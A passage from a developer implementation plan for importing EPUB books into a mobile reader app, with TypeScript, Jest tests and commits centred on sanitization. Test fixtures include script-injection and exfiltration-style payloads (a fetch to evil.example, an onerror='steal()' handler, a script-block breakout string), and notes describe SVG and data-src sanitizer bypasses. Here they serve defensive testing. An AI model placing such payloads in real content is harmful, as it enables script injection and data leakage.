import type { SpineItem } from "@/openshelves/epubReader";
import { toBase64 } from "@/storage/epubLibrary";

// The DOM-free half of import: rewrite a chapter's references so the stored HTML
// points at nothing outside itself.
//
// This is NOT sanitization — it cannot be, because import runs on Hermes where
// there is no DOM (see the spec's D-I4 revision). DOMPurify still runs at the
// render boundary. What this DOES guarantee is that opening a book makes no
// network request: every surviving reference is a data: URI from inside the zip.

export const MAX_IMAGE_BYTES = 10 * 1024 * 1024;

const MIME: Record<string, string> = {
  png: "image/png", jpg: "image/jpeg", jpeg: "image/jpeg",
  gif: "image/gif", webp: "image/webp", svg: "image/svg+xml",
};

function mimeFor(path: string): string | undefined {
  return MIME[path.split(".").pop()?.toLowerCase() ?? ""];
}

/** Body-only: strip the document shell so chapters compose into one reader. */
function bodyOf(html: string): string {
  const m = /<body[^>]*>([\s\S]*?)<\/body>/i.exec(html);
  return (m ? m[1] : html).trim();
}

export function rewriteChapterHtml(item: SpineItem): string {
  let html = bodyOf(item.html);

  // External resources: dropped outright. EPUB CSS is not honoured (D-I3) and a
  // remote script/stylesheet is both a phone-home and a styling hazard.
  html = html.replace(/<link\b[^>]*>/gi, "");
  html = html.replace(/<script\b[^>]*>[\s\S]*?<\/script\s*>/gi, "");
  html = html.replace(/<script\b[^>]*\/>/gi, "");

  // Images: inline from the zip, or drop. Never fetch.
  html = html.replace(/<img\b[^>]*>/gi, (tag) => {
    const src = /\bsrc="([^"]*)"/i.exec(tag)?.[1];
    if (!src) return "";
    const bytes = item.images[src];
    if (!bytes) return ""; // remote, missing, or otherwise unresolvable → drop
    if (bytes.byteLength > MAX_IMAGE_BYTES) return "";
    const mime = mimeFor(src);
    if (!mime) return "";
    const data = `data:${mime};base64,${toBase64(bytes.slice().buffer)}`;
    return tag.replace(/\bsrc="[^"]*"/i, `src="${data}"`);
  });

  return html.trim();
}
```

- [ ] **Step 4: Run it and watch it pass**

Run: `cd mobile && npx jest __tests__/openshelves/epubChapterHtml.test.ts`
Expected: PASS — 8 tests.

- [ ] **Step 5: Prove no network happens — spy on fetch**

```ts
// append to mobile/__tests__/openshelves/epubChapterHtml.test.ts
it("never calls fetch, for any input (the phone-home guarantee)", () => {
  const spy = jest.spyOn(global, "fetch" as never);
  rewriteChapterHtml(item('<img src="https://evil.example/a.png"/><img src="ok.png"/>', { "ok.png": png }));
  expect(spy).not.toHaveBeenCalled();
  spy.mockRestore();
});
```

Run: `cd mobile && npx jest __tests__/openshelves/epubChapterHtml.test.ts`
Expected: PASS — 9 tests.

- [ ] **Step 6: Commit**

```bash
git add mobile/src/openshelves/epubChapterHtml.ts mobile/__tests__/openshelves/epubChapterHtml.test.ts
git commit -m "feat(open-shelves): chapter reference rewrite — inline zip images, drop remote refs

The DOM-free half of import (spec D-I4, revised). NOT sanitization — Hermes has
no DOM; DOMPurify runs at the render boundary. Guarantees opening a book makes
no network request: fetch is spied and asserted never called."
```

---

## Task 4: `Book.chapters` + `epubToBook.ts` — the mapping

**Files:**
- Modify: `mobile/src/types/book.ts`
- Create: `mobile/src/openshelves/epubToBook.ts`
- Test: `mobile/__tests__/openshelves/epubToBook.test.ts`

**Interfaces:**
- Consumes: `ParsedEpub` (Task 2), `rewriteChapterHtml` (Task 3).
- Produces:
  ```ts
  // in @/types/book
  export interface ImportedChapter { chapterId: string; title: string; html: string; importedAt: string }
  // Book gains: chapters?: Record<string, ImportedChapter>
  // Book.source gains the "imported" value
  // in @/openshelves/epubToBook
  export function epubToBook(parsed: ParsedEpub, opts: { id: string; now: string }): Book;
  ```

- [ ] **Step 1: Write the failing test**

```ts
// mobile/__tests__/openshelves/epubToBook.test.ts
import { epubToBook } from "@/openshelves/epubToBook";
import type { ParsedEpub } from "@/openshelves/epubReader";

function parsed(over: Partial<ParsedEpub> = {}): ParsedEpub {
  return {
    metadata: { title: "Frankenstein", authors: ["Mary Shelley"], language: "en" },
    spine: [
      { id: "c1", title: "Letter 1", html: "<p>To Mrs Saville.</p>", images: {} },
      { id: "c2", title: "Letter 2", html: "<p>How slowly.</p>", images: {} },
    ],
    ...over,
  };
}

describe("epubToBook", () => {
  const opts = { id: "bk-1", now: "2026-07-16T00:00:00.000Z" };

  it("maps the spine onto the existing StructuredTOC so the Library works unchanged", () => {
    const b = epubToBook(parsed(), opts);
    expect(b.toc.subjects).toHaveLength(1);
    expect(b.toc.subjects[0].units.map((u) => u.title)).toEqual(["Letter 1", "Letter 2"]);
  });

  it("stores chapters in `chapters`, NEVER in `content`", () => {
    const b = epubToBook(parsed(), opts);
    // `content` means LLM-generated, schema-validated material. An imported
    // chapter is neither — two fields, two meanings.
    expect(b.content).toBeUndefined();
    expect(Object.keys(b.chapters!)).toHaveLength(2);
  });

  it("keys each chapter by its TOC unit id, so the reader can find it", () => {
    const b = epubToBook(parsed(), opts);
    const unitIds = b.toc.subjects[0].units.map((u) => u.id!);
    expect(Object.keys(b.chapters!).sort()).toEqual([...unitIds].sort());
    expect(b.chapters![unitIds[0]].html).toContain("To Mrs Saville.");
  });

  it("marks the book imported and carries its bibliographic metadata", () => {
    const b = epubToBook(parsed(), opts);
    expect(b.source).toBe("imported");
    expect(b.title).toBe("Frankenstein");
    expect(b.metadata?.author).toBe("Mary Shelley");
  });

  it("keeps an empty chapter so the TOC matches the book's real structure", () => {
    const b = epubToBook(parsed({
      spine: [{ id: "c1", title: "Blank", html: "", images: {} }],
    }), opts);
    expect(b.toc.subjects[0].units).toHaveLength(1);
    expect(Object.values(b.chapters!)[0].html).toBe("");
  });

  it("is pure — the same input twice yields the same output", () => {
    expect(epubToBook(parsed(), opts)).toEqual(epubToBook(parsed(), opts));
  });
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `cd mobile && npx jest __tests__/openshelves/epubToBook.test.ts`
Expected: FAIL — `Cannot find module '@/openshelves/epubToBook'`

- [ ] **Step 3: Add the types**

```ts
// mobile/src/types/book.ts — add near TopicImage

// One chapter of an imported book (Open Shelves F1).
//
// DELIBERATELY separate from `GeneratedTopic`/`content`: that type means
// LLM-generated, schema-validated material with provenance and a trust manifest.
// An imported chapter is third-party prose we unzipped. Reusing `content` would
// be the tempting shortcut and it would lie to the type system.
export interface ImportedChapter {
  chapterId: string;   // == the TOC unit id
  title: string;
  /** Body HTML, references already rewritten (data: URIs only). UNSANITIZED —
   *  the render boundary sanitizes (spec D-I4). */
  html: string;
  importedAt: string;  // ISO
}
```

Then extend `Book`:

```ts
// mobile/src/types/book.ts — in the Book interface, beside `content`
  /** Imported book chapters, keyed by TOC unit id. Never mixed with `content`. */
  chapters?: Record<string, ImportedChapter>;
```

Confirm `Book.source` admits `"imported"`; if its type is a union, add the member.

- [ ] **Step 4: Implement `epubToBook.ts`**

```ts
// mobile/src/openshelves/epubToBook.ts
import type { Book, ImportedChapter, StructuredTOC, TopicNode } from "@/types/book";
import type { ParsedEpub } from "@/openshelves/epubReader";
import { rewriteChapterHtml } from "@/openshelves/epubChapterHtml";

// ParsedEpub → Book. Pure, no I/O — the easiest unit to test hard.
//
// The spine maps onto the EXISTING StructuredTOC, so the Library, the book list,
// the TOC drawer and progress all work unchanged. That is the whole reason this
// mapping is worth having.

export function epubToBook(parsed: ParsedEpub, opts: { id: string; now: string }): Book {
  const units: TopicNode[] = [];
  const chapters: Record<string, ImportedChapter> = {};

  parsed.spine.forEach((item, i) => {
    const chapterId = `${opts.id}-ch${i + 1}`;
    units.push({ id: chapterId, title: item.title, subtopics: [], prerequisites: [] });
    chapters[chapterId] = {
      chapterId,
      title: item.title,
      html: rewriteChapterHtml(item),
      importedAt: opts.now,
    };
  });

  const toc: StructuredTOC = {
    subjects: [{ subject_label: parsed.metadata.title, units }],
  } as StructuredTOC;

  return {
    id: opts.id,
    title: parsed.metadata.title,
    toc,
    createdAt: opts.now,
    updatedAt: opts.now,
    source: "imported",
    chapters,
    metadata: {
      author: parsed.metadata.authors.join(", ") || undefined,
      language: parsed.metadata.language,
    },
  } as Book;
}
```

- [ ] **Step 5: Run it and watch it pass**

Run: `cd mobile && npx jest __tests__/openshelves/epubToBook.test.ts && npx tsc --noEmit`
Expected: PASS — 6 tests; tsc reports 0 errors.

- [ ] **Step 6: Commit**

```bash
git add mobile/src/types/book.ts mobile/src/openshelves/epubToBook.ts mobile/__tests__/openshelves/epubToBook.test.ts
git commit -m "feat(open-shelves): epubToBook — spine → StructuredTOC, chapters kept out of content

Book.chapters is deliberately separate from Book.content: content means
LLM-generated, schema-validated material. An imported chapter is neither. Two
fields, two meanings — no lying to the type system."
```

---

## Task 5: `importEpub.ts` — atomic orchestration

**Files:**
- Create: `mobile/src/openshelves/importEpub.ts`
- Test: `mobile/__tests__/openshelves/importEpub.test.ts`

**Interfaces:**
- Consumes: `readEpub` (Task 2), `epubToBook` (Task 4), `saveBook` from `@/storage/bookStore`, `randomUUID` from `@/lib/uuid`.
- Produces:
  ```ts
  export const MAX_EPUB_BYTES = 50 * 1024 * 1024;
  export function importEpub(bytes: Uint8Array): Promise<Book>;  // throws EpubError
  ```

- [ ] **Step 1: Write the failing test**

```ts
// mobile/__tests__/openshelves/importEpub.test.ts
jest.mock("@/storage/bookStore", () => ({ saveBook: jest.fn(async () => {}) }));
jest.mock("@/lib/uuid", () => ({ randomUUID: () => "bk-fixed" }));

import { zipSync, strToU8 } from "fflate";
import { importEpub, MAX_EPUB_BYTES } from "@/openshelves/importEpub";
import { EpubError } from "@/storage/epubZip";
import { saveBook } from "@/storage/bookStore";

const CONTAINER = `<?xml version="1.0"?><container><rootfiles>
  <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
</rootfiles></container>`;

function goodEpub(): Uint8Array {
  return zipSync({
    "META-INF/container.xml": strToU8(CONTAINER),
    "OEBPS/content.opf": strToU8(`<package xmlns:dc="http://purl.org/dc/elements/1.1/">
      <metadata><dc:title>Frankenstein</dc:title></metadata>
      <manifest><item id="c1" href="ch1.xhtml" media-type="application/xhtml+xml"/></manifest>
      <spine><itemref idref="c1"/></spine></package>`),
    "OEBPS/ch1.xhtml": strToU8("<html><body><h1>Letter 1</h1><p>Hi</p></body></html>"),
  });
}

beforeEach(() => jest.clearAllMocks());

describe("importEpub", () => {
  it("imports a normal EPUB and persists exactly one book", async () => {
    const book = await importEpub(goodEpub());
    expect(book.title).toBe("Frankenstein");
    expect(book.source).toBe("imported");
    expect(saveBook).toHaveBeenCalledTimes(1);
  });

  it("is ATOMIC: a parse failure persists nothing", async () => {
    await expect(importEpub(strToU8("not a zip"))).rejects.toBeInstanceOf(EpubError);
    expect(saveBook).not.toHaveBeenCalled();
  });

  it("refuses an oversize file before doing any work", async () => {
    await expect(importEpub(new Uint8Array(MAX_EPUB_BYTES + 1))).rejects.toThrow(/too large/i);
    expect(saveBook).not.toHaveBeenCalled();
  });

  it("gives every import a fresh id, so importing twice yields two books", async () => {
    const book = await importEpub(goodEpub());
    expect(book.id).toBe("bk-fixed"); // from randomUUID — never the EPUB's own id
  });

  it("never calls fetch", async () => {
    const spy = jest.spyOn(global, "fetch" as never);
    await importEpub(goodEpub());
    expect(spy).not.toHaveBeenCalled();
    spy.mockRestore();
  });
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `cd mobile && npx jest __tests__/openshelves/importEpub.test.ts`
Expected: FAIL — `Cannot find module '@/openshelves/importEpub'`

- [ ] **Step 3: Implement `importEpub.ts`**

```ts
// mobile/src/openshelves/importEpub.ts
import type { Book } from "@/types/book";
import { readEpub } from "@/openshelves/epubReader";
import { epubToBook } from "@/openshelves/epubToBook";
import { EpubError } from "@/storage/epubZip";
import { saveBook } from "@/storage/bookStore";
import { randomUUID } from "@/lib/uuid";

// Read → map → persist. The one slow step of F1.
//
// ATOMIC by construction: everything before `saveBook` is pure and in-memory, so
// a malformed or hostile EPUB fails loudly here and persists NOTHING. Same
// discipline as addSource — validate and parse fully before touching the store.

export const MAX_EPUB_BYTES = 50 * 1024 * 1024;

export async function importEpub(bytes: Uint8Array): Promise<Book> {
  if (bytes.byteLength > MAX_EPUB_BYTES) {
    throw new EpubError("That EPUB is too large to open (max 50 MB).");
  }
  const parsed = readEpub(bytes); // throws EpubError; nothing persisted yet
  const book = epubToBook(parsed, { id: randomUUID(), now: new Date().toISOString() });
  await saveBook(book);
  return book;
}
```

- [ ] **Step 4: Run it and watch it pass**

Run: `cd mobile && npx jest __tests__/openshelves/importEpub.test.ts`
Expected: PASS — 5 tests.

- [ ] **Step 5: Commit**

```bash
git add mobile/src/openshelves/importEpub.ts mobile/__tests__/openshelves/importEpub.test.ts
git commit -m "feat(open-shelves): importEpub — atomic read → map → persist

Everything before saveBook is pure and in-memory, so a hostile EPUB fails loudly
at import and persists nothing. Fresh id per import. fetch spied, never called."
```

---

## Task 6: Render an imported chapter — and inline DOMPurify in the WebView

**Files:**
- Modify: `mobile/src/reader/topicHtml.ts`
- Modify: `mobile/src/components/contentHtml.ts`
- Test: `mobile/__tests__/reader/importedChapter.test.ts`

**Interfaces:**
- Consumes: `ImportedChapter` (Task 4).
- Produces:
  ```ts
  // in @/reader/topicHtml
  export function renderChapterToHtml(chapter: ImportedChapter): string;
  // in @/components/contentHtml
  export function buildChapterHtml(chapter: ImportedChapter): string;
  ```

> **⚠ Amended (2026-07-16) — an `<img>` may have NO map entry, and must then be dropped.**
> `chapterImageMap` (Task 3) **silently omits** any image over `MAX_IMAGE_BYTES` or with an unknown
> mime. So a chapter can carry `<img src="huge.png">` with no corresponding entry. Task 6 must **drop
> such tags**, not leave the original `src` in place — "swap src from the map" must not degrade to
> "leave it alone when the lookup misses". Test an oversize/unknown-mime image end to end.
>
> **⚠ Amended again (2026-07-16) — "drop non-`data:` refs" is NOT sufficient. A `data:` URI can be a
> document.** Task 3's review demonstrated: `chapterImageMap` inlines an SVG verbatim, so an
> `<img src="data:image/svg+xml;base64,…">` whose decoded payload contains
> `<image href="https://evil.example/x.png"/>` and `<script>` **passes a flat non-`data:` check** —
> its `src` genuinely *is* a `data:` URI. The remote ref lives one level down, inside the decoded SVG
> document, which a hook scoped to the host document will not recurse into.
>
> So Task 6 must **also sanitize decoded `image/svg+xml` payloads as their own document** (DOMPurify
> with the SVG profile, then re-encode), or refuse SVG entirely. Do not assume this falls out of
> "drop non-`data:` refs" — it provably does not. Test it with the exact payload above, on both
> surfaces.
>
> **Amended during execution (2026-07-16) — Task 6 now owns the no-network guarantee.**
> Task 3's regex rewrite was proven bypassable (a `data-src` decoy lets a remote `<img src>` survive
> into the stored chapter). A regex cannot enforce this; a DOM can. So the render boundary — which
> already exists here for sanitization — becomes the enforcement point:
>
> **Add a DOMPurify hook (`afterSanitizeAttributes`) that drops any `src`/`href` which is not a
> `data:` URI**, on BOTH surfaces: native (DOMPurify inlined in the WebView, below) and web
> (`sanitizeFragment` in `renderContent.ts`). A real DOM parses `data-src` and `src` as distinct
> attributes and is not fooled by quoting, so the decoy dies here regardless of what import missed.
>
> Note the reviewer's point that made this necessary: DOMPurify's *default* configuration will NOT
> strip `<img src="https://…">` — remote images are unremarkable markup a sanitizer has no reason to
> remove. The hook is what makes it enforcement rather than an assumption. Test it with the same
> `data-src` decoy input that defeated Task 3, on both surfaces.

**Why the WebView changes (read before implementing):** this is the task the spec's **D-I6** exists for. Native has **no DOM-side sanitizer**, and an imported chapter is third-party HTML. DOMPurify must run **inside the WebView** — the only place on native with a DOM. It must be **inlined**, not fetched: #325 proved a CDN-dependent reader shows nothing offline, and an imported public-domain book that needs a network to open defeats the point of downloading it. DOMPurify is ~20KB, unlike KaTeX/Mermaid's 4.8MB, so inlining it is cheap.

The chapter crosses into the WebView as a **JSON string** (via `jsonForScriptBlock`, which escapes `<` — see GHSA-48wh-p7cx-c87j) and is sanitized **before** any `innerHTML`, so it is never parsed as HTML while unsanitized.

- [ ] **Step 1: Write the failing test**

```ts
// mobile/__tests__/reader/importedChapter.test.ts
import { renderChapterToHtml } from "@/reader/topicHtml";
import { buildChapterHtml } from "@/components/contentHtml";
import type { ImportedChapter } from "@/types/book";

function ch(html: string): ImportedChapter {
  return { chapterId: "c1", title: "Letter 1", html, importedAt: "x" };
}

describe("renderChapterToHtml (shared, Hermes-safe)", () => {
  it("renders the chapter's HTML under its title", () => {
    const out = renderChapterToHtml(ch("<p>To Mrs Saville.</p>"));
    expect(out).toContain("<h1>Letter 1</h1>");
    expect(out).toContain("<p>To Mrs Saville.</p>");
  });

  it("does NOT run the markdown pipeline over it — it is already HTML", () => {
    const out = renderChapterToHtml(ch("<p>*not emphasis*</p>"));
    expect(out).toContain("*not emphasis*");
    expect(out).not.toContain("<em>");
  });

  it("is total: an empty chapter still renders its heading", () => {
    expect(renderChapterToHtml(ch(""))).toContain("<h1>Letter 1</h1>");
  });
});

describe("buildChapterHtml (the native WebView document)", () => {
  it("inlines DOMPurify rather than fetching it — an imported book must open offline", () => {
    const doc = buildChapterHtml(ch("<p>Body</p>"));
    expect(doc).not.toContain("cdn.jsdelivr.net/npm/dompurify");
    expect(doc).toContain("DOMPurify"); // the library itself is in the document
  });

  it("sanitizes BEFORE assigning innerHTML — never parse untrusted HTML unsanitized", () => {
    const doc = buildChapterHtml(ch("<p>Body</p>"));
    const sanitizeAt = doc.indexOf("DOMPurify.sanitize");
    const assignAt = doc.indexOf("innerHTML =");
    expect(sanitizeAt).toBeGreaterThan(-1);
    expect(sanitizeAt).toBeLessThan(assignAt);
  });

  it("escapes the embed so chapter content cannot break out of the script block", () => {
    const doc = buildChapterHtml(ch("<p>Teaching HTML: </script><img src=x onerror=BREAKOUT></p>"));
    const region = doc.slice(doc.indexOf("var DATA"), doc.indexOf("})();"));
    expect(region).not.toContain("</script>");
    expect(doc).not.toContain("onerror=BREAKOUT");
  });
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `cd mobile && npx jest __tests__/reader/importedChapter.test.ts`
Expected: FAIL — `renderChapterToHtml is not a function`

- [ ] **Step 3: Add `renderChapterToHtml` to the shared renderer**

```ts
// mobile/src/reader/topicHtml.ts — append; import the type at the top
import type { GeneratedTopic, ImportedChapter } from "@/types/book";

/**
 * An imported book's chapter → HTML. It is ALREADY HTML (unzipped from the
 * EPUB), so the markdown pipeline must not touch it — running marked over prose
 * that contains `*asterisks*` would silently rewrite the author's text.
 *
 * UNSANITIZED, like `renderTopicToHtml`: the caller owns the boundary.
 */
export function renderChapterToHtml(chapter: ImportedChapter): string {
  return `<h1>${escapeHtml(chapter.title)}</h1>${chapter.html}`;
}
```

(`escapeHtml` is already imported from `@/reader/markdown` in this file.)

- [ ] **Step 4: Inline DOMPurify into the WebView document**

```ts
// mobile/src/components/contentHtml.ts — add near the top
// DOMPurify's source, inlined into the WebView document.
//
// It CANNOT come from a CDN: #325 proved a reader that fetches its renderer shows
// nothing offline, and an imported public-domain book that needs a network to
// open defeats the entire point of downloading it (spec D-I6). At ~20KB this is
// cheap — unlike KaTeX/Mermaid's 4.8MB, which stay remote and optional.
//
// This is the SAME library the web reader uses (@/reader/sanitize), not a second
// sanitizer. It runs in the WebView because that is the only place on native with
// a DOM — Hermes has none.
// eslint-disable-next-line @typescript-eslint/no-var-requires
const DOMPURIFY_SRC: string = require("dompurify/dist/purify.min.js.txt");
```

**If that `require` does not resolve**, read the file at build time instead — add to `mobile/metro.config.js`:

```js
// mobile/metro.config.js — allow importing a .js library as a STRING for WebView injection
const { getDefaultConfig } = require("expo/metro-config");
const config = getDefaultConfig(__dirname);
config.resolver.assetExts.push("txt");
module.exports = config;
```

and create `mobile/assets/webview/purify.min.js.txt` by copying `node_modules/dompurify/dist/purify.min.js`, with a build note in the file header. **Verify the copy is byte-identical to the installed version** so the inlined copy cannot silently drift from the dependency:

```bash
cp mobile/node_modules/dompurify/dist/purify.min.js mobile/assets/webview/purify.min.js.txt
diff -q mobile/node_modules/dompurify/dist/purify.min.js mobile/assets/webview/purify.min.js.txt
```

- [ ] **Step 5: Add `buildChapterHtml`**

```ts
// mobile/src/components/contentHtml.ts — append
import { renderChapterToHtml } from "@/reader/topicHtml";
import type { ImportedChapter } from "@/types/book";

/**
 * The WebView document for one imported chapter.
 *
 * Unlike `buildTopicHtml`, the body here is THIRD-PARTY HTML from an arbitrary
 * catalog, so it is sanitized inside the WebView (the only place on native with a
 * DOM) before it is ever assigned to innerHTML. The chapter travels as a JSON
 * string escaped by `jsonForScriptBlock`, so it cannot break out of the script
 * block on the way in (GHSA-48wh-p7cx-c87j).
 */
export function buildChapterHtml(chapter: ImportedChapter): string {
  return htmlChapterDocument(
    jsonForScriptBlock({ __html: renderChapterToHtml(chapter) }),
  );
}

function htmlChapterDocument(dataJson: string): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
${READER_STYLES}
</head>
<body>
<div id="root">Loading…</div>
<script>${DOMPURIFY_SRC}</script>
<script>
(function () {
  var DATA = ${dataJson};
  // Sanitize BEFORE the string is ever parsed as HTML. An imported chapter is
  // untrusted third-party content; this is the boundary.
  var clean = DOMPurify.sanitize(DATA.__html, { USE_PROFILES: { html: true, svg: true } });
  document.getElementById('root').innerHTML = clean;
})();
</script>
</body>
</html>`;
}
```

Extract the existing `<style>…</style>` block in this file into a `READER_STYLES` const so both documents share one stylesheet rather than duplicating it.

- [ ] **Step 6: Run it and watch it pass**

Run: `cd mobile && npx jest __tests__/reader/importedChapter.test.ts && npx tsc --noEmit`
Expected: PASS — 6 tests; tsc 0 errors.

- [ ] **Step 7: Prove the sanitizer actually bites — execute the document's JS**

```ts
// append to mobile/__tests__/reader/importedChapter.test.ts
/** @jest-environment jsdom */
it("strips a script from an imported chapter, asserted over the parsed DOM", () => {
  const doc = buildChapterHtml(ch('<p>Real</p><script>fetch("https://evil.example")</script><img src=x onerror="steal()">'));
  const m = doc.match(/var DATA = (\{.*?\});\n/s)!;
  const html = (JSON.parse(m[1]) as { __html: string }).__html;
  // Run the SAME sanitizer the WebView runs, over the same input.
  const DOMPurify = require("dompurify");
  const clean = DOMPurify.sanitize(html, { USE_PROFILES: { html: true, svg: true } });
  const el = document.createElement("div");
  el.innerHTML = clean;
  expect(el.querySelector("script")).toBeNull();
  expect(el.querySelector("img")?.getAttribute("onerror")).toBeNull();
  expect(el.textContent).toContain("Real");
});
```

Run: `cd mobile && npx jest __tests__/reader/importedChapter.test.ts`
Expected: PASS — 7 tests.

- [ ] **Step 8: Commit**

```bash
git add mobile/src/reader/topicHtml.ts mobile/src/components/contentHtml.ts mobile/__tests__/reader/importedChapter.test.ts mobile/metro.config.js mobile/assets/webview/
git commit -m "feat(open-shelves): render imported chapters; inline DOMPurify in the WebView

Spec D-I4/D-I6. Native has no DOM-side sanitizer, and an imported chapter is
third-party HTML — so DOMPurify runs INSIDE the WebView (the only place on native
with a DOM), inlined rather than fetched because a book that needs a network to
open is not an offline book (#325). ~20KB, unlike KaTeX/Mermaid's 4.8MB.
Sanitize happens before innerHTML; the chapter crosses as an escaped JSON string."
```

---

## Task 7: Open + Import UI, Library integration, Help

**Files:**
- Modify: `mobile/app/shelves/downloads.tsx`
- Modify: `mobile/app/(tabs)/shelves.tsx`
- Modify: `mobile/src/help-content/features.ts`
- Modify: `mobile/src/help-content/topics.ts`
- Test: `mobile/__tests__/app/shelves-downloads-open.test.tsx`

**Interfaces:**
- Consumes: `importEpub` (Task 5), `getDownload` from `@/openshelves/downloadsStore`.
- Produces: no new exports — this is the surface.

- [ ] **Step 1: Write the failing test**

```tsx
// mobile/__tests__/app/shelves-downloads-open.test.tsx
import React from "react";
import { fireEvent, render, screen, waitFor } from "@testing-library/react-native";

jest.mock("expo-router", () => ({ useRouter: () => ({ push: mockPush }), useLocalSearchParams: () => ({}) }));
const mockPush = jest.fn();
jest.mock("@/openshelves/importEpub", () => ({ importEpub: jest.fn(async () => ({ id: "bk-1", title: "Frankenstein" })) }));
jest.mock("@/openshelves/useDownloads", () => ({
  useDownloads: () => ({
    downloads: [{ entryId: "e1", title: "Frankenstein", bytes: 100, path: "file:///f.epub", mediaType: "application/epub+zip" }],
    loading: false, error: null, remove: jest.fn(), removeAll: jest.fn(), reload: jest.fn(),
  }),
}));
jest.mock("expo-file-system", () => ({ readAsStringAsync: jest.fn(async () => "AAAA"), EncodingType: { Base64: "base64" } }));

import { importEpub } from "@/openshelves/importEpub";
import DownloadsScreen from "@/../app/shelves/downloads";

beforeEach(() => jest.clearAllMocks());

it("Open imports the downloaded EPUB and navigates to the book", async () => {
  render(<DownloadsScreen />);
  fireEvent.press(screen.getByLabelText("Open Frankenstein"));
  await waitFor(() => expect(importEpub).toHaveBeenCalled());
  await waitFor(() => expect(mockPush).toHaveBeenCalledWith(expect.stringContaining("bk-1")));
});

it("surfaces an import failure instead of failing silently", async () => {
  (importEpub as jest.Mock).mockRejectedValueOnce(new Error("This book is copy-protected (DRM), so it can't be opened here."));
  render(<DownloadsScreen />);
  fireEvent.press(screen.getByLabelText("Open Frankenstein"));
  expect(await screen.findByText(/copy-protected/i)).toBeTruthy();
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `cd mobile && npx jest __tests__/app/shelves-downloads-open.test.tsx`
Expected: FAIL — no element with label "Open Frankenstein".

- [ ] **Step 3: Add Open to the Downloads screen**

In `mobile/app/shelves/downloads.tsx`, add an Open control per row (native only — on web the file was never held; D-I5):

```tsx
// imports
import { Platform } from "react-native";
import * as FileSystem from "expo-file-system";
import { useRouter } from "expo-router";
import { importEpub } from "@/openshelves/importEpub";
import { fromBase64 } from "@/storage/pickBookFile";

// inside the component
const router = useRouter();
const [opening, setOpening] = useState<string | null>(null);
const [openError, setOpenError] = useState<string | null>(null);

async function open(rec: { entryId: string; title: string; path: string }) {
  setOpenError(null);
  setOpening(rec.entryId);
  try {
    const b64 = await FileSystem.readAsStringAsync(rec.path, { encoding: FileSystem.EncodingType.Base64 });
    const book = await importEpub(new Uint8Array(fromBase64(b64)));
    router.push(`/book/read/${book.id}`);
  } catch (e) {
    // Import failures are specific and actionable ("copy-protected", "too large").
    // Show them — a silent failure on a book the user chose to open is the worst
    // outcome.
    setOpenError(e instanceof Error ? e.message : "Couldn't open that book.");
  } finally {
    setOpening(null);
  }
}
```

Render, per row (only where `Platform.OS !== "web"` and the record is an EPUB):

```tsx
{Platform.OS !== "web" && rec.mediaType === "application/epub+zip" && (
  <Pressable
    onPress={() => open(rec)}
    accessibilityRole="button"
    accessibilityLabel={`Open ${rec.title}`}
    disabled={opening === rec.entryId}
  >
    <Text style={styles.openBtn}>{opening === rec.entryId ? "Opening…" : "Open"}</Text>
  </Pressable>
)}
{openError && <Text style={styles.error}>{openError}</Text>}
```

- [ ] **Step 4: Run it and watch it pass**

Run: `cd mobile && npx jest __tests__/app/shelves-downloads-open.test.tsx`
Expected: PASS — 2 tests.

- [ ] **Step 5: Add "Import an EPUB" to the Shelves screen (web path, D-I5)**

On web the download is fire-and-forget through the browser and re-fetching is blocked by CORS — and routing book **content** through our backend is forbidden (ADR-028 D2). So web imports from a file picker:

```tsx
// mobile/app/(tabs)/shelves.tsx
import { pickBookFileOrBundle } from "@/storage/pickBookFile";
import { importEpub } from "@/openshelves/importEpub";

async function importFromPicker() {
  const picked = await pickBookFileOrBundle();
  if (!picked || picked.kind !== "zip") return;
  const book = await importEpub(new Uint8Array(picked.bytes));
  router.push(`/book/read/${book.id}`);
}
```

Render it beside Add source:

```tsx
<Pressable onPress={importFromPicker} accessibilityRole="button" accessibilityLabel="Import an EPUB">
  <Text style={styles.secondaryBtn}>Import an EPUB</Text>
</Pressable>
```

- [ ] **Step 6: Wire the reader to render chapters**

> **⚠ AMENDED DURING EXECUTION (2026-07-16).** This step originally read "in the
> read screen, alongside the existing content lookup, `return <ChapterRenderer
> chapter={chapter} />`". **That matched no actual file** — there is no single
> "content lookup". Tracing the real chain found two defects the step never
> mentioned:
>
> 1. **`TopicReadList` would render nothing.** Its `flatten()` sets
>    `hasContent: hasRenderableLesson(content[u.id])` — reading `book.content`
>    only. An imported book carries `book.chapters`, so every row would be
>    `hasContent:false`, `topics.some(...)` would be false, the list would return
>    `null`, and the read screen would fall back to its edit-only layout. **The
>    imported book would be invisible.** (Its comment already claims "generated /
>    imported content" — a doc claim ahead of the code.)
> 2. **`app/book/topic/[bookId]/[topicId].tsx` is an AUTHORING screen** —
>    Regenerate, enhancement instructions, trust manifest, provenance/staleness.
>    Routing an imported chapter through it would offer **"Regenerate this topic"
>    on Frankenstein**, overwriting third-party public-domain text with an LLM
>    lesson.
>
> **Decision (user):** a dedicated **read-only chapter route**. Imported content
> is third-party and read-only by nature (ADR-028 — we are a catalog client); it
> is not ours to regenerate, enhance, or attest. The topic screen is left
> untouched.

**6a — the web chapter reader.** Create `mobile/src/reader/NativeChapterReader.web.tsx`, mirroring `NativeTopicReader.web.tsx` exactly:

```tsx
// The web chapter reader: an IMPORTED book's chapter rendered into the app's own
// DOM. Mirrors NativeTopicReader.web.tsx.
//
// Security: there is no iframe boundary here, so `renderChapterToSafeHtml` IS the
// boundary. Never inject anything into this subtree that has not been through it.
// Unlike a topic, a chapter is third-party HTML from a stranger's EPUB, and its
// sanitize pass is stricter: images resolve from the chapter's own map or are
// dropped, and every URI-bearing attribute is reduced to `data:`-only.

import React, { useMemo, useRef } from "react";
import { View, StyleSheet } from "react-native";
import type { ImportedChapter } from "@/types/book";
import { renderChapterToSafeHtml } from "@/reader/renderContent";
import { READER_CSS, READER_ROOT_CLASS } from "@/reader/readerStyles";
import { colors } from "@/constants/theme";

export function NativeChapterReader({ chapter }: { chapter: ImportedChapter }) {
  const ref = useRef<HTMLDivElement | null>(null);
  const html = useMemo(() => renderChapterToSafeHtml(chapter), [chapter]);

  // NOTE: no `enhanceReaderNode` here. That pass runs KaTeX + Mermaid over the
